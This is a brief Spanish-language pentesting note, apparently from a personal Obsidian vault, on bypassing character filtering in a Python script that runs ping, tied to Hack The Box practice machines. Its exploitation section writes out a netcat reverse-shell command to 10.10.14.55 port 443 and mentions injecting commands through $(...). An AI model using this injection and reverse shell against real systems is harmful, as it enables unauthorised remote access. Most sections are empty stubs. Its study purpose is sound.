## DESCRIPTION



#### Mas información
* 


## EXPLOITATION

Ejemplo de un script en python en el que podemos ejecutar ping y tiene control de caracteres que le introducimos.

En el codigo vemos que ejecuta ping pero tiene unos carácteres restringidos:

![[Pasted image 20230606134943.png]]

Creamos un fichero “shell.sh” en /tmp con el siguiente contenido → nc -e /bin/sh 10.10.14.55 443


IMPORTANTE SE PUEDE EJECUTAR UN COMANDO USANDO $(LOQUESEA)

![[Pasted image 20230606135038.png]]

## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 